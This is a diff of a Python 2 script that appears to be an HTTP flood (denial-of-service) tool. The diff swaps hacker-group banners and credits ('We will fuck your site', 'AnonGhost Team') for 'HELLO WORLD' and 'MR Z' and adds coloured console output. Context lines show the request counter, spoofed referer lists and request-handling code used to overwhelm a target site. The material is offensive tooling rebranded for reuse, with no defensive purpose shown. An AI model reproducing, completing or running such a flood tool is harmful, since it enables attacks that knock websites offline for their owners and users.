@@ -1,8 +1,9 @@
+
 ####################################->
-#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
-#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
-#5afc3c0f68ff47b53b485fcd53e898a9######---->SadAttack :(
-#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
+#4312644bf54db17180c8a95add9fdc06####-->#~~~~~~~~~~HELLO WORLD~~~~~~~~#
+#9dfb17e500b557a9d985c08da4fd0aaf#####--->#~~~~~~~~~~HELLO WORLD~~~~~~~~#
+#5afc3c0f68ff47b53b485fcd53e898a9######---->#~~~~~~~~~~HELLO WORLD~~~~~~~~#
+#ff46a6b3100d11c29d4233c72f604a10#####--->#~~~~~~~~~~HELLO WORLD~~~~~~~~#
 #6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
 ####################################->
 #https://www.youtube.com/watch?v=Aps4ZczffVw#
@@ -17,11 +18,11 @@ import re
 
 #global params                                                                                       
 url=''                                                                                              ###############################
-host=''                                                                                             #~~~~Created By Hax Stroke~~~~#
-headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
-headers_referers=[]                                                                                 #fb.com/anonghostsoldierstroke#
-request_counter=0                                                                                   #~~~youtube.com/c/HaXStroKE~~~#
-flag=0                                                                                              #~~~~~Twitter:@HaxStroKE~~~~~~#
+host=''                                                                                             #~~~~~~~~~~HELLO WORLD~~~~~~~~#
+headers_useragents=[]                                                                               #~~~~~~~~~~HELLO WORLD~~~~~~~~#
+headers_referers=[]                                                                                 #~~~~~~~~~~HELLO WORLD~~~~~~~~#
+request_counter=0                                                                                   #~~~~~~~~~~HELLO WORLD~~~~~~~~##
+flag=0                                                                                              #~~~~~~~~~~HELLO WORLD~~~~~~~~#
 safe=0                                                                                              ###############################
 
 def inc_counter():
@@ -62,7 +63,7 @@ def referer_list():
 	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
 	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
 	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
-	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
+	headers_referers.append('http://www.bing.com/search?q=')                                   #From MR Z                 #
 	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
 	headers_referers.append('http://www.ask.com/web?q=')
 	headers_referers.append('http://search.lycos.com/web/?q=')
@@ -187,14 +188,17 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print '                                                                    ' 
- 			print '4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38'
-                        print '4431264478942389043267532789o43209327478943bf54db17180c8a95add9fdc06'
-			print '4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38'
- 			print '37353638293tehdueudbd6453739364383tdhe6293udf93745647483y6r648494947'
- 			print '652627435447389292t737837653768ghdiuehiuheyi3878297928hweiuyw9827y98'
-			print '4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38'
- 			print '                                                                    '
+ 			print '                                                                     ' 
+			print ("\033[94m 37353638293tehdueudbd6453739364383tdhe6293udf93745647483y6r648494947 \033[0m")
+ 			print ("\033[92m 4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38 \033[0m") 
+                        print ("\033[93m 4431264478942389043267532789o43209327478943bf54db17180c8a95add9fdc06 \033[0m")
+			print ("\033[91m 4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38 \033[0m")
+ 			print ("\033[94m 37353638293tehdueudbd6453739364383tdhe6293udf93745647483y6r648494947 \033[0m")
+ 			print ("\033[95m 652627435447389292t737837653768ghdiuehiuheyi3878297928hweiuyw9827y98 \033[0m")
+			print ("\033[97m 4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38 \033[0m")
+			print ("\033[91m 4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38 \033[0m")
+ 			print ("\033[91m 4734312644bf54db17180c843265tewghjghsayjkaqh264542723a95add9fdc06<38 \033[0m")
+			print '                                                                    '
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
